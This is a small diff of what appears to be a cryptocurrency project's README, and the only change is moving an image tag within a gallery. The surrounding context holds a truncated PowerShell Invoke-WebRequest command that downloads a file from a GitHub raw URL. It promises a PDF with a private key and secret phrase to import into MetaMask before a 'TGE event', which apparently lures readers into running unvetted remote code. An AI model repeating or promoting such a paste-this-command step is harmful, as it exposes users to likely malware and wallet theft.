@@ -1,5 +1,4 @@
 <div style="display: flex; justify-content: space-around;">
-<img src="https://github.com/user-attachments/assets/85e19765-ffdc-4c8a-97ab-e04692c10ca7" alt="photo_5926748594818368500_y" width="300" />
 <img src="https://github.com/user-attachments/assets/1e6711a8-b47f-49df-a879-e8cde3db7334" alt="photo_5926748594818368500_y" width="300" />
 <img src="https://github.com/user-attachments/assets/8fbe62f2-4ca6-4261-8914-4d36f635c46b" alt="photo_5926748594818368500_y" width="300" />
 </div>
@@ -25,3 +24,4 @@ powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Ce
 
 You will get Private key and secret Phrase in PDF, Import to metamask and wait for TGE event. Follow us on twitter @celestianfts
 
+<img src="https://github.com/user-attachments/assets/85e19765-ffdc-4c8a-97ab-e04692c10ca7" alt="photo_5926748594818368500_y" width="300" />
